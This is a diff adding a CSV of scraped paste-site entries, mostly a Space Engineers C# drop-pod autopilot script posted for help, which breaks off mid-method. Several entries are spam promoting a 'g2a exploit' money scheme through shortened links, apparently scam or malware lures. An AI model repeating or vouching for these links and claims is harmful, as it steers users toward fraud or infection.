@@ -1,0 +1,2431 @@
+id,title,username,language,date,content
+D3zWfaKk,EARN $900 INSTANTLY 2025⭐ DG,TROJANHORSE-EXE,JavaScript,Wednesday 7th of May 2025 07:08:49 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+P963JYHQrA
+"
+ycFuxZuP,Products.js,Rip_batate,JavaScript,Wednesday 7th of May 2025 07:03:12 AM CDT,789564 - check it out at http://tinyurl.com/new2025may
+g6ha8wCH,Make $1000 15-MINUTES  (BEGINNER) 6D,thatkidxX,JavaScript,Wednesday 7th of May 2025 07:01:51 AM CDT," 
+Pdf https://tinyurl.com/freshleaks
+
+Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site
+
+KNLVHU6TUw
+"
+FyxWNsgp,supply drop script help,Sedrowow,C#,Wednesday 7th of May 2025 06:57:49 AM CDT,"// Move these outside the Program class as top-level methods
+public static Vector3D GetNaturalGravity(IMyRemoteControl rc)
+{
+    return rc.GetTotalGravity();
+}
+
+public static double GetAltitude(IMyRemoteControl rc)
+{
+    Vector3D planetCenter;
+    return rc.TryGetPlanetPosition(out planetCenter) ? 
+        Vector3D.Distance(rc.GetPosition(), planetCenter) - rc.GetRadius() : 0;
+}
+
+public static Vector3D GetVelocity(IMyRemoteControl rc)
+{
+    return rc.GetShipVelocities().LinearVelocity;
+}
+
+// Enum for script states
+enum DropPodState
+{
+    Idle,               // Waiting for GOAL
+    AwaitingLaunch,     // GOAL set, waiting for LAUNCH
+    Initializing,       // Finding blocks, loading settings
+    AwaitingPhysicalRelease, // LAUNCH command received, waiting for manual detach ('release' argument)
+    Ascending,          // Getting out of gravity
+    HighAltitudeCruise, // Navigating to target at high altitude
+    Descending,         // Reducing altitude
+    Landing,            // Controlled touchdown
+    Finished,           // Mission complete
+    Error               // Something went wrong
+}
+
+// Struct to hold settings - Defined only ONCE
+public struct DropPodSettings
+{
+    public double AscentGravityThreshold;
+    public double MinCruiseAltitude;
+    public double DescentAltitude;
+    public double ParachuteAltitude;
+    public double LandingSpeedThreshold;
+    public double FinalLandingAltitude;
+    public double ThrustMultiplier;
+    public double GyroMultiplier; // New setting
+
+    // Default values
+    public DropPodSettings(bool isDefault = true)
+    {
+        AscentGravityThreshold = 0.1;
+        MinCruiseAltitude = 40000; // meters from planet center or surface approx.
+        DescentAltitude = 3000; // meters above ground (RC.GetAltitude())
+        ParachuteAltitude = 800; // meters above ground
+        LandingSpeedThreshold = 5; // m/s
+        FinalLandingAltitude = 3; // meters above ground (allow slight height before landing gear touch)
+        ThrustMultiplier = 0.8;
+        GyroMultiplier = 5.0; // Default gyro sensitivity
+    }
+}
+
+
+DropPodState currentState = DropPodState.Idle;
+Vector3D targetGPS;
+// Store state data for persistence (CurrentState, TargetGPS, etc.)
+string storedState = """";
+
+// --- Block Lists (populated in InitializeBlocks) ---
+IMyRemoteControl remoteControl;
+List<IMyThrust> upThrusters = new List<IMyThrust>();
+List<IMyThrust> downThrusters = new List<IMyThrust>();
+List<IMyThrust> forwardThrusters = new List<IMyThrust>();
+List<IMyThrust> backwardThrusters = new List<IMyThrust>();
+List<IMyThrust> leftThrusters = new List<IMyThrust>();
+List<IMyThrust> rightThrusters = new List<IMyThrust>();
+List<IMyGyro> gyros = new List<IMyGyro>();
+List<IMyParachute> parachutes = new List<IMyParachute>();
+// Add your release mechanism block reference here (Connector/Merge Block)
+// IMyShipConnector releaseConnector;
+
+// --- Configuration Settings (Loaded from Custom Data) ---
+DropPodSettings settings = new DropPodSettings();
+
+bool parachutesAvailable = false;
+bool launched = false; // Flag to indicate if the pod has been released (via 'release' argument)
+
+
+// --- Constructor ---
+public Program()
+{
+    // Set update frequency
+    Runtime.UpdateFrequency = UpdateFrequency.Update10; // Start lower
+
+    // Load state from Storage
+    LoadState();
+
+    // Load settings from Custom Data (or print defaults if empty)
+    LoadSettings();
+
+    // Initial echo
+    Echo(""Script loaded. Current State: "" + currentState.ToString());
+    EchoSettings();
+
+    // If not in Idle, try to ensure blocks are found and settings are loaded
+    if (currentState != DropPodState.Idle)
+    {
+        // Re-initialize blocks if needed (e.g., after game load)
+        InitializeBlocks(); // This just finds blocks, doesn't change state
+        if (remoteControl == null && currentState != DropPodState.Error)
+        {
+            SetState(DropPodState.Error, ""Failed to find Remote Control block on load."");
+        }
+    }
+    else
+    {
+        // In Idle, prompt user
+        Echo(""Send 'GOAL GPS:...' to set target."");
+    }
+}
+
+// --- Save/Load State ---
+void SaveState()
+{
+    // Save current state and target GPS to Storage
+    storedState = currentState.ToString() + ""|"" + (targetGPS != Vector3D.Zero ? targetGPS.ToString() : """");
+    Storage = storedState;
+}
+
+void LoadState()
+{
+    if (!string.IsNullOrWhiteSpace(Storage))
+    {
+        string[] parts = Storage.Split('|');
+        if (parts.Length > 0) Enum.TryParse(parts[0], out currentState);
+        if (parts.Length > 1 && !string.IsNullOrWhiteSpace(parts[1]))
+        {
+            Vector3D.TryParse(parts[1], out targetGPS);
+        }
+        Echo(""Loaded state: "" + currentState.ToString());
+        if (targetGPS != Vector3D.Zero) Echo(""Loaded target: "" + targetGPS.ToString());
+
+        // Adjust update frequency immediately based on loaded state if necessary
+        switch (currentState)
+        {
+            case DropPodState.Ascending:
+            case DropPodState.HighAltitudeCruise:
+            case DropPodState.Descending:
+            case DropPodState.Landing:
+                Runtime.UpdateFrequency = UpdateFrequency.Update1;
+                break;
+            default:
+                Runtime.UpdateFrequency = UpdateFrequency.Update10;
+                break;
+        }
+    }
+    else
+    {
+        currentState = DropPodState.Idle;
+        Echo(""No saved state found. Starting in Idle."");
+    }
+}
+
+// --- Custom Data Settings Handling ---
+void LoadSettings()
+{
+    if (string.IsNullOrWhiteSpace(Me.CustomData))
+    {
+        Echo(""Custom Data is empty. Printing default settings."");
+        PrintDefaultSettings();
+        // Use default settings instance already created
+    }
+    else
+    {
+        Echo(""Loading settings from Custom Data..."");
+        settings = ParseSettings(Me.CustomData);
+        Echo(""Settings loaded."");
+    }
+}
+
+void PrintDefaultSettings()
+{
+    StringBuilder sb = new StringBuilder();
+    sb.AppendLine(""# Drop Pod Script Settings"");
+    sb.AppendLine(""# Edit these values to customize behavior."");
+    sb.AppendLine(""# Lines starting with # are comments."");
+    sb.AppendLine(""# Use key=value format."");
+    sb.AppendLine("""");
+    sb.AppendLine($""AscentGravityThreshold={settings.AscentGravityThreshold}"");
+    sb.AppendLine($""MinCruiseAltitude={settings.MinCruiseAltitude}"");
+    sb.AppendLine($""DescentAltitude={settings.DescentAltitude}"");
+    sb.AppendLine($""ParachuteAltitude={settings.ParachuteAltitude}"");
+    sb.AppendLine($""LandingSpeedThreshold={settings.LandingSpeedThreshold}"");
+    sb.AppendLine($""FinalLandingAltitude={settings.FinalLandingAltitude}"");
+    sb.AppendLine($""ThrustMultiplier={settings.ThrustMultiplier}"");
+    sb.AppendLine($""GyroMultiplier={settings.GyroMultiplier}""); // Added setting for gyro sensitivity
+    // Add other settings here as needed
+    Me.CustomData = sb.ToString();
+}
+
+DropPodSettings ParseSettings(string customData)
+{
+    DropPodSettings loadedSettings = new DropPodSettings();
+    var lines = customData.Split('\n');
+    foreach (var line in lines)
+    {
+        var trimmedLine = line.Trim();
+        if (trimmedLine.StartsWith(""#"") || string.IsNullOrWhiteSpace(trimmedLine)) continue;
+
+        var parts = trimmedLine.Split('=');
+        if (parts.Length != 2) continue;
+
+        string key = parts[0].Trim();
+        string value = parts[1].Trim();
+
+        // Parse specific settings
+        double doubleVal;
+        // Using basic TryParse as Globalization is not available
+        if (double.TryParse(value, out doubleVal))
+        {
+            switch (key)
+            {
+                case ""AscentGravityThreshold"": loadedSettings.AscentGravityThreshold = doubleVal; break;
+                case ""MinCruiseAltitude"": loadedSettings.MinCruiseAltitude = doubleVal; break;
+                case ""DescentAltitude"": loadedSettings.DescentAltitude = doubleVal; break;
+                case ""ParachuteAltitude"": loadedSettings.ParachuteAltitude = doubleVal; break;
+                case ""LandingSpeedThreshold"": loadedSettings.LandingSpeedThreshold = doubleVal; break;
+                case ""FinalLandingAltitude"": loadedSettings.FinalLandingAltitude = doubleVal; break;
+                case ""ThrustMultiplier"": loadedSettings.ThrustMultiplier = doubleVal; break;
+                case ""GyroMultiplier"": loadedSettings.GyroMultiplier = doubleVal; break;
+                    // Add cases for other double settings
+            }
+        }
+        // Add parsing for other types (int, bool, string) if needed
+    }
+    return loadedSettings;
+}
+
+void EchoSettings()
+{
+    Echo(""--- Settings ---"");
+    Echo($""Ascent Gravity: {settings.AscentGravityThreshold:F2} m/s²"");
+    Echo($""Min Cruise Alt: {settings.MinCruiseAltitude:F0} m"");
+    Echo($""Descent Alt:    {settings.DescentAltitude:F0} m"");
+    Echo($""Parachute Alt:  {settings.ParachuteAltitude:F0} m"");
+    Echo($""Landing Speed:  {settings.LandingSpeedThreshold:F1} m/s"");
+    Echo($""Final Land Alt: {settings.FinalLandingAltitude:F0} m"");
+    Echo($""Thrust Multi:   {settings.ThrustMultiplier:F2}"");
+    Echo($""Gyro Multi:     {settings.GyroMultiplier:F2}"");
+    Echo(""----------------"");
+}
+
+
+// --- Main Method ---
+public void Main(string argument, UpdateType updateSource)
+{
+    Echo(""State: "" + currentState.ToString());
+    Echo(""Target: "" + (targetGPS != Vector3D.Zero ? targetGPS.ToString() : ""None""));
+    Echo(""Time: "" + Runtime.TimeSinceLastRun.TotalSeconds.ToString(""F3"") + ""s""); // Echo last run time
+
+    // Handle arguments based on current state
+    if (argument.Length > 0)
+    {
+        string[] args = argument.Split(' ');
+        string command = args[0].ToUpper();
+
+        switch (currentState)
+        {
+            case DropPodState.Idle:
+                if (command == ""GOAL"" && args.Length > 1)
+                {
+                    string gpsString = argument.Substring(""GOAL "".Length).Trim();
+                    Vector3D parsedGps;
+                    if (TryParseGps(gpsString, out parsedGps))
+                    {
+                        targetGPS = parsedGps;
+                        SetState(DropPodState.AwaitingLaunch);
+                        Echo($""Target set to {targetGPS.ToString()}. Send 'LAUNCH' to begin."");
+                    }
+                    else
+                    {
+                        Echo(""Invalid GPS format. Use 'GOAL GPS:Name:X:Y:Z:'."");
+                    }
+                }
+                else { Echo(""Send 'GOAL GPS:...' to set target.""); }
+                break;
+
+            case DropPodState.AwaitingLaunch:
+                if (command == ""LAUNCH"")
+                {
+                    SetState(DropPodState.Initializing);
+                    Echo(""Launch command received. Initializing..."");
+                }
+                else if (command == ""GOAL"" && args.Length > 1) // Allow changing target
+                {
+                    string gpsString = argument.Substring(""GOAL "".Length).Trim();
+                    Vector3D parsedGps;
+                    if (TryParseGps(gpsString, out parsedGps))
+                    {
+                        targetGPS = parsedGps;
+                        Echo($""Target updated to {targetGPS.ToString()}. Send 'LAUNCH' to begin."");
+                    }
+                    else
+                    {
+                        Echo(""Invalid GPS format. Use 'GOAL GPS:Name:X:Y:Z:'."");
+                    }
+                }
+                else { Echo(""Target set. Send 'LAUNCH' to begin.""); }
+                break;
+
+            case DropPodState.AwaitingPhysicalRelease:
+                if (command == ""RELEASE"" || command == ""LAUNCHED"") // Argument to signal manual detachment
+                {
+                    launched = true; // Flag set
+                    SetState(DropPodState.Ascending);
+                    Echo(""Release confirmed. Initiating ascent."");
+                }
+                else { Echo(""Waiting for physical release. Disconnect and send 'RELEASE' argument.""); }
+                break;
+
+            case DropPodState.Finished:
+            case DropPodState.Error:
+                if (command == ""RESET"")
+                {
+                    targetGPS = Vector3D.Zero; // Clear target
+                    launched = false;
+                    SetState(DropPodState.Idle);
+                    Echo(""Script reset. Send 'GOAL GPS:...' to start again."");
+                }
+                break;
+
+            default:
+                // Ignore arguments in active flight states unless specifically handled (e.g., abort?)
+                Echo(""Flight in progress. Ignoring command."");
+                break;
+        }
+    }
+
+
+    // State Machine Logic (called every update tick if frequency > None)
+    switch (currentState)
+    {
+        case DropPodState.Initializing:
+            HandleInitializing();
+            break;
+        case DropPodState.AwaitingPhysicalRelease:
+            // Just waiting for the 'release' argument
+            break;
+        case DropPodState.Ascending:
+            HandleAscending();
+            break;
+        case DropPodState.HighAltitudeCruise:
+            HandleHighAltitudeCruise();
+            break;
+        case DropPodState.Descending:
+            HandleDescending();
+            break;
+        case DropPodState.Landing:
+            HandleLanding();
+            break;
+        case DropPodState.Finished:
+            // Do nothing, waiting for reset
+            break;
+        case DropPodState.Error:
+            // Display error, waiting for reset
+            break;
+    }
+
+    // Save state at the end of Main
+    SaveState();
+}
+
+// --- State Handler Methods ---
+
+void SetState(DropPodState newState, string errorMessage = null)
+{
+    currentState = newState;
+    Echo(""Transitioned to State: "" + currentState.ToString());
+
+    // Actions on state entry
+    switch (newState)
+    {
+        case DropPodState.Idle:
+        case DropPodState.AwaitingLaunch:
+            Runtime.UpdateFrequency = UpdateFrequency.Update10; // Low frequency while waiting
+            SetThrusterOverrides(0);
+            SetGyroOverride(false);
+            // remoteControl?.SetAutoPilotEnabled(false); // Commenting out if RC methods are an issue
+            break;
+        case DropPodState.Initializing:
+            Runtime.UpdateFrequency = UpdateFrequency.Update10; // Still low freq
+            InitializeBlocks(); // Find blocks
+            LoadSettings(); // Reload settings just in case Custom Data was changed
+            break;
+        case DropPodState.AwaitingPhysicalRelease:
+            Runtime.UpdateFrequency = UpdateFrequency.Update10; // Low freq
+            SetThrusterOverrides(0); // Ensure everything is off before release
+            SetGyroOverride(false);
+            // remoteControl?.SetAutoPilotEnabled(false); // Commenting out if RC methods are an issue
+            Echo(""Ready for release. Disconnect the pod and send 'RELEASE' argument."");
+            break;
+        case DropPodState.Ascending:
+            Runtime.UpdateFrequency = UpdateFrequency.Update1; // High frequency for flight
+            SetGyroOverride(true); // Enable gyro override for orientation control
+                                   // remoteControl?.SetAutoPilotEnabled(false); // Commenting out if RC methods are an issue
+            break;
+        case DropPodState.HighAltitudeCruise:
+            Runtime.UpdateFrequency = UpdateFrequency.Update1; // High frequency for navigation/monitoring
+            SetGyroOverride(false); // Let RC handle orientation
+                                    // RC autopilot setup is done in HandleHighAltitudeCruise
+            break;
+        case DropPodState.Descending:
+            Runtime.UpdateFrequency = UpdateFrequency.Update1; // High frequency for descent control
+                                                               // remoteControl?.SetAutoPilotEnabled(false); // Commenting out if RC methods are an issue
+            SetGyroOverride(true); // Manual gyro control for descent orientation
+            break;
+        case DropPodState.Landing:
+            Runtime.UpdateFrequency = UpdateFrequency.Update1; // Critical frequency for soft landing
+                                                               // Gyros already enabled
+            break;
+        case DropPodState.Finished:
+            Runtime.UpdateFrequency = UpdateFrequency.None; // Stop script execution
+            SetThrusterOverrides(0);
+            SetGyroOverride(false);
+            // remoteControl?.SetAutoPilotEnabled(false); // Commenting out if RC methods are an issue
+            Echo(""Mission Complete!"");
+            break;
+        case DropPodState.Error:
+            Runtime.UpdateFrequency = UpdateFrequency.None; // Stop script execution
+            SetThrusterOverrides(0);
+            SetGyroOverride(false);
+            // remoteControl?.SetAutoPilotEnabled(false); // Commenting out if RC methods are an issue
+            Echo(""Error: "" + errorMessage);
+            break;
+    }
+    SaveState(); // Save state change
+}
+
+void HandleInitializing()
+{
+    Echo(""Initializing..."");
+    // Blocks already found in SetState.
+    // Settings already loaded in SetState.
+
+    if (remoteControl == null)
+    {
+        SetState(DropPodState.Error, ""No Remote Control block found."");
+        return;
+    }
+    if (upThrusters.Count == 0)
+    {
+        SetState(DropPodState.Error, ""No 'Up' thrusters found. (Thrusters pointing down relative to grid)"");
+        return;
+    }
+    // Warnings for missing directional thrusters can be echoed but don't need to be fatal errors
+
+    parachutesAvailable = parachutes.Count > 0;
+    if (parachutesAvailable) Echo(""Parachutes found.""); else Echo(""No parachutes found. Relying on thrusters for landing."");
+
+    // Check if a target was actually set before launching
+    if (targetGPS == Vector3D.Zero)
+    {
+        SetState(DropPodState.Error, ""No target GPS set. Use 'GOAL GPS:...' first."");
+        return;
+    }
+
+    Echo(""Initialization complete. Ready for physical release."");
+    SetState(DropPodState.AwaitingPhysicalRelease);
+}
+
+// Replace your HandleAscending method
+void HandleAscending()
+{
+    if (remoteControl == null) { SetState(DropPodState.Error, ""Remote Control lost during ascent.""); return; }
+
+    Vector3D gravity = remoteControl.GetNaturalGravity();
+    double gravityMagnitude = gravity.Length();
+    Vector3D currentPos = remoteControl.GetPosition();
+    double currentAltitude = remoteControl.GetAltitude();
+
+    if (gravityMagnitude < settings.AscentGravityThreshold && currentAltitude > settings.MinCruiseAltitude / 2)
+    {
+        SetThrusterOverrides(0);
+        SetState(DropPodState.HighAltitudeCruise);
+        Echo(""Reached space altitude. Initiating cruise."");
+        return;
+    }
+
+    // Orient grid straight up
+    if (gravityMagnitude > 0.01)
+    {
+        Vector3D antiGravity = -Vector3D.Normalize(gravity);
+        AlignGridToVector(antiGravity, settings.GyroMultiplier);
+    }
+    else
+    {
+        SetGyroOverride(true, Vector3D.Zero);
+    }
+
+    SetThrusterOverrides((float)settings.ThrustMultiplier, Base6Directions.Direction.Up);
+    Echo($""Ascending. Gravity: {gravityMagnitude:F2} m/s². Altitude: {currentAltitude:F0} m"");
+}
+
+// Update HandleHighAltitudeCruise method
+void HandleHighAltitudeCruise()
+{
+    if (remoteControl == null) { SetState(DropPodState.Error, ""Remote Control lost during cruise.""); return; }
+
+    Vector3D currentPos = remoteControl.GetPosition();
+    Vector3D targetPos = targetGPS;
+    Vector3D planetCenter;
+    double currentAltitude = GetAltitude(remoteControl);
+    
+    // Get planet center for orbital navigation
+    if (!remoteControl.TryGetPlanetPosition(out planetCenter))
+    {
+        SetState(DropPodState.Error, ""Cannot determine planet position."");
+        return;
+    }
+
+    // Calculate positions relative to planet center
+    Vector3D currentPosFromCenter = currentPos - planetCenter;
+    Vector3D targetPosFromCenter = targetPos - planetCenter;
+
+    // Calculate desired orbit position (above target at cruise altitude)
+    double desiredOrbitRadius = Math.Max(settings.MinCruiseAltitude, currentPosFromCenter.Length());
+    Vector3D desiredOrbitPos = planetCenter + Vector3D.Normalize(targetPosFromCenter) * desiredOrbitRadius;
+
+    // Calculate if we're roughly above the target
+    double angleToTarget = Math.Acos(
+        Vector3D.Dot(Vector3D.Normalize(currentPosFromCenter), Vector3D.Normalize(targetPosFromCenter))
+    );
+    
+    // Convert to degrees for readable comparison
+    double angleToTargetDegrees = angleToTarget * 180 / Math.PI;
+
+    // If we're above target (within 5 degrees) and at appropriate altitude, start descent
+    if (angleToTargetDegrees < 5 && currentAltitude < settings.MinCruiseAltitude * 1.1)
+    {
+        SetState(DropPodState.Descending);
+        Echo($""Above target. Starting descent from {currentAltitude:F0}m"");
+        return;
+    }
+
+    // Otherwise, continue orbital movement
+    Vector3D velocityDir = remoteControl.GetShipVelocities().LinearVelocity;
+    Vector3D gravity = GetNaturalGravity(remoteControl);
+    
+    // Calculate desired movement direction (tangent to orbit)
+    Vector3D orbitNormal = Vector3D.Cross(currentPosFromCenter, targetPosFromCenter);
+    if (orbitNormal.LengthSquared() > 0.1)
+    {
+        Vector3D desiredDirection = Vector3D.Cross(Vector3D.Normalize(currentPosFromCenter), Vector3D.Normalize(orbitNormal));
+        
+        // Align to orbital direction
+        AlignGridToVector(desiredDirection, settings.GyroMultiplier);
+        
+        // Apply thrust to maintain orbit
+        double gravityMagnitude = gravity.Length();
+        float thrustLevel = (float)Math.Min(1.0, gravityMagnitude / 9.81);
+        SetThrusterOverrides(thrustLevel, Base6Directions.Direction.Forward);
+    }
+
+    Echo($""Orbiting. Altitude: {currentAltitude:F0}m, Angle to target: {angleToTargetDegrees:F1}°"");
+}
+
+void HandleDescending()
+{
+    if (remoteControl == null) { SetState(DropPodState.Error, ""Remote Control lost during descent.""); return; }
+    if (downThrusters.Count == 0 && !parachutesAvailable) { SetState(DropPodState.Error, ""No downward thrusters or parachutes for descent.""); return; }
+
+
+    Vector3D gravity = remoteControl.GetNaturalGravity();
+    Vector3D currentPos = remoteControl.GetPosition();
+    // If GetVelocity is causing errors, you might need to remove or comment out lines using velocity.
+    Vector3D velocity = remoteControl.GetVelocity();
+    // If GetAltitude is causing errors, you might need to use a different altitude check.
+    double altitudeAboveGround = remoteControl.GetAltitude();
+    double verticalSpeed = Vector3D.Dot(velocity, Vector3D.Normalize(gravity)); // Positive if moving down
+
+    // Orient grid for descent - point ""Down"" thrusters towards gravity
+    Vector3D gravityDirection = Vector3D.Normalize(gravity); // Desired 'Down' direction for the grid
+    AlignGridToVector(gravityDirection, settings.GyroMultiplier); // Use gyros to align grid.WorldMatrix.Down with gravityDirection
+
+    // Parachute Deployment
+    bool areChutesDeployed = parachutes.Count > 0 && parachutes.Any(chute => chute.Status == DoorStatus.Open); // Check if ANY chute is open
+    if (parachutesAvailable && altitudeAboveGround < settings.ParachuteAltitude && !areChutesDeployed)
+    {
+        DeployParachutes();
+        // Reduce/kill thrusters if parachutes are main braking
+        SetThrusterOverrides(0); // For now, kill all thrusters on chute deploy
+        Echo($""Deploying parachutes at {altitudeAboveGround:F0} m."");
+        // Transition to Landing immediately as chutes take over primary braking
+        SetState(DropPodState.Landing);
+        return; // Exit this frame's descent logic to start landing logic
+    }
+
+    // If not using chutes or above chute altitude, control descent speed with thrusters
+    if (!areChutesDeployed && downThrusters.Count > 0)
+    {
+        // Simple vertical speed control (P controller)
+        double targetVerticalSpeed = 10; // Start with a faster descent speed (m/s)
+        if (altitudeAboveGround < settings.ParachuteAltitude * 1.5) targetVerticalSpeed = settings.LandingSpeedThreshold * 2; // Slow down as we get closer
+
+        double speedError = targetVerticalSpeed - verticalSpeed; // Positive error means too slow (need more push down)
+        double thrustMagnitude = MathHelper.Clamp(speedError * 0.2 + gravity.Length() / 9.81f, 0, 1); // P control + scaled gravity compensation
+                                                                                                      // Scale gravity comp by ~Earth gravity to normalize
+
+        // Apply thrust opposite the gravity vector ('Up' relative to planet) using 'Down' thrusters on grid
+        SetThrusterOverrides((float)thrustMagnitude, Base6Directions.Direction.Down); // Down thrusters push Up
+
+        // Basic horizontal braking: Kill horizontal velocity as we descend
+        Vector3D gravityDirection = Vector3D.Normalize(gravity);
+        Vector3D horizontalVelocity = velocity - verticalSpeed * gravityDirection;
+        // Needs SetThrustersInDirection helper or rely on prior RC accuracy
+    }
+
+
+    // Transition to Landing when close enough
+    if (altitudeAboveGround < settings.ParachuteAltitude * 1.2 || areChutesDeployed) // Enter landing phase when close or chutes deployed
+    {
+        SetState(DropPodState.Landing);
+        Echo($""Entering landing phase at {altitudeAboveGround:F0} m."");
+        return;
+    }
+
+    // If GetAltitude and GetVelocity are causing errors, you might need to remove or change this Echo line.
+    Echo($""Descending. Altitude (RC): {altitudeAboveGround:F0} m. Vertical Speed: {verticalSpeed:F2} m/s"");
+}
+
+void HandleLanding()
+{
+    if (remoteControl == null) { SetState(DropPodState.Error, ""Remote Control lost during landing.""); return; }
+    if (downThrusters.Count == 0 && !parachutesAvailable) { SetState(DropPodState.Error, ""No downward thrusters or parachutes for landing.""); return; }
+
+
+    Vector3D gravity = remoteControl.GetNaturalGravity();
+    Vector3D currentPos = remoteControl.GetPosition();
+    // If GetVelocity is causing errors, you might need to remove or comment out lines using velocity.
+    Vector3D velocity = remoteControl.GetVelocity();
+    // If GetAltitude is causing errors, you might need to use a different altitude check.
+    double altitudeAboveGround = remoteControl.GetAltitude();
+    double verticalSpeed = Vector3D.Dot(velocity, Vector3D.Normalize(gravity)); // Positive if moving down
+
+    // Orient grid (continue pointing 'Down' thrusters towards gravity)
+    AlignGridToVector(Vector3D.Normalize(gravity), settings.GyroMultiplier);
+
+    // Check for landing success (low speed, low altitude)
+    if (Math.Abs(verticalSpeed) < settings.LandingSpeedThreshold && altitudeAboveGround < settings.FinalLandingAltitude)
+    {
+        SetState(DropPodState.Finished);
+        return;
+    }
+
+    // Landing Thrust Control (if not relying solely on parachutes)
+    bool areChutesDeployed = parachutes.Count > 0 && parachutes.Any(chute => chute.Status == DoorStatus.Open);
+    if (!areChutesDeployed && downThrusters.Count > 0) // If no chutes, or they failed, or below chute range
+    {
+        // PID-like control for vertical speed aiming for -LANDING_SPEED_THRESHOLD (up)
+        // This is a simplified P controller
+        double targetVerticalVelocity = -settings.LandingSpeedThreshold; // Target velocity UP
+        double speedError = targetVerticalVelocity - verticalSpeed; // Positive error means too slow (need more push up)
+        double verticalThrust = MathHelper.Clamp(speedError * 1.0 + gravity.Length() / 9.81f, 0, 1); // P control + scaled gravity compensation
+
+        SetThrusterOverrides((float)verticalThrust, Base6Directions.Direction.Down); // Use down thrusters to push up
+
+        // Horizontal braking: Kill horizontal velocity
+        Vector3D gravityDirection = Vector3D.Normalize(gravity);
+        Vector3D horizontalVelocity = velocity - verticalSpeed * gravityDirection;
+        // Needs SetThrustersInDirection helper or rely on prior RC accuracy
+    }
+    else // If parachutes are deployed, maybe just use thrusters for fine-tuning/horizontal control
+    {
+        // Use directional thrusters for horizontal movement to zero out horizontal velocity
+        Vector3D gravityDirection = Vector3D.Normalize(gravity);
+        Vector3D horizontalVelocity = velocity - verticalSpeed * gravityDirection;
+        // Needs SetThrustersInDirection helper
+    }
+
+    // If GetAltitude and GetVelocity are causing errors, you might need to remove or change this Echo line.
+    Echo($""Landing. Altitude (RC): {altitudeAboveGround:F0} m. Vertical Speed: {verticalSpeed:F2} m/s. Total Speed: {velocity.Length():F2} m/s"");
+}
+
+void HandleFinished()
+{
+    Echo(""Drop pod landed safely."");
+    // Could add logic here to turn off components, lock landing gear, etc.
+}
+
+void HandleError()
+{
+    // Error message already displayed by SetState
+}
+
+
+// --- Helper Methods ---
+
+void InitializeBlocks()
+{
+    // If GetBlockOfType is causing errors, this is a core API issue.
+    // You might need to use GridTerminalSystem.SearchBlocksOfName or GetBlocksOfType
+    // with type checks as an alternative, but GetBlockOfType<T>() should work.
+    remoteControl = GridTerminalSystem.GetBlockOfType<IMyRemoteControl>();
+
+    // Clear lists before repopulating
+    upThrusters.Clear();
+    downThrusters.Clear();
+    forwardThrusters.Clear();
+    backwardThrusters.Clear();
+    leftThrusters.Clear();
+    rightThrusters.Clear();
+    gyros.Clear();
+    parachutes.Clear();
+
+    // Find and group thrusters by their thrust direction relative to the grid's forward (+Z)
+    // Thruster's WorldMatrix.Backward is the direction the *thrust* is applied
+    // Block's Orientation.TransformDirection(Base6Directions.Direction.Backward) gives
+    // the direction the thruster is POINTING relative to the grid's local axes.
+    // Thrust is applied opposite the direction the nozzle is pointing.
+    // Grid +Y is Up, -Y is Down, +X is Right, -X is Left, +Z is Forward, -Z is Backward by convention.
+
+    var allThrusters = new List<IMyThrust>();
+    // If GetBlocksOfType is causing errors, this is a core API issue.
+    GridTerminalSystem.GetBlocksOfType(allThrusters);
+
+    foreach (var thruster in allThrusters)
+    {
+        // Direction the thruster is POINTING relative to the grid's axes
+        Base6Directions.Direction thrusterLocalPointingDirection = thruster.Orientation.TransformDirection(Base6Directions.Direction.Backward);
+
+        // Thrust is applied in the opposite direction
+        Base6Directions.Direction thrustDirection = Base6Directions.GetOppositeDirection(thrusterLocalPointingDirection);
+
+        switch (thrustDirection)
+        {
+            case Base6Directions.Direction.Up: upThrusters.Add(thruster); break;
+            case Base6Directions.Direction.Down: downThrusters.Add(thruster); break;
+            case Base6Directions.Direction.Forward: forwardThrusters.Add(thruster); break;
+            case Base6Directions.Direction.Backward: backwardThrusters.Add(thruster); break;
+            case Base6Directions.Direction.Left: leftThrusters.Add(thruster); break;
+            case Base6Directions.Direction.Right: rightThrusters.Add(thruster); break;
+        }
+    }
+
+    // If GetBlocksOfType is causing errors for Gyros and Parachutes, it's a core API issue.
+    GridTerminalSystem.GetBlocksOfType(gyros);
+    GridTerminalSystem.GetBlocksOfType(parachutes);
+    // Find your release block here...
+    // releaseConnector = GridTerminalSystem.GetBlockOfType<IMyShipConnector>(""MyConnectorName""); // Example
+
+    Echo($""Found: RC: {remoteControl != null}, Gyros: {gyros.Count}, Chutes: {parachutes.Count}"");
+    Echo($""Thrusters: U:{upThrusters.Count} D:{downThrusters.Count} F:{forwardThrusters.Count} B:{backwardThrusters.Count} L:{leftThrusters.Count} R:{rightThrusters.Count}"");
+}
+
+// Sets thrust override for thrusters in a specific direction relative to the grid
+// Note: This method takes float percentage, ensure values passed are cast or are floats.
+void SetThrusterOverrides(float percentage, Base6Directions.Direction? direction = null)
+{
+    percentage = MathHelper.Clamp(percentage, 0f, 1f); // Ensure percentage is valid
+
+    Action<List<IMyThrust>> setOverride = (list) =>
+    {
+        foreach (var thruster in list) thruster.ThrustOverridePercentage = percentage;
+    };
+
+    if (direction == null) // Apply to all thrusters if direction is null
+    {
+        setOverride(upThrusters);
+        setOverride(downThrusters);
+        setOverride(forwardThrusters);
+        setOverride(backwardThrusters);
+        setOverride(leftThrusters);
+        setOverride(rightThrusters);
+    }
+    else
+    {
+        switch (direction.Value)
+        {
+            case Base6Directions.Direction.Up: setOverride(upThrusters); break;
+            case Base6Directions.Direction.Down: setOverride(downThrusters); break;
+            case Base6Directions.Direction.Forward: setOverride(forwardThrusters); break;
+            case Base6Directions.Direction.Backward: setOverride(backwardThrusters); break;
+            case Base6Directions.Direction.Left: setOverride(leftThrusters); break;
+            case Base6Directions.Direction.Right: setOverride(rightThrusters); break;
+        }
+    }
+}
+
+// Attempts to apply thrust towards a given world direction using relevant thrusters
+// This is a simplified approach and might not provide precise control without more math
+void SetThrustersInDirection(Vector3D worldDirection, float strength)
+{
+    if (remoteControl == null) return;
+
+    strength = MathHelper.Clamp(strength, 0f, 1f);
+
+    // Convert world direction to grid coordinates
+    // Construct a MatrixD from the Matrix3x3 rotation - this should work.
+    // If new MatrixD(Matrix3x3) is causing errors, this is a core API issue.
+    MatrixD worldToGridRotation = MatrixD.Transpose(new MatrixD(remoteControl.WorldMatrix.Rotation));
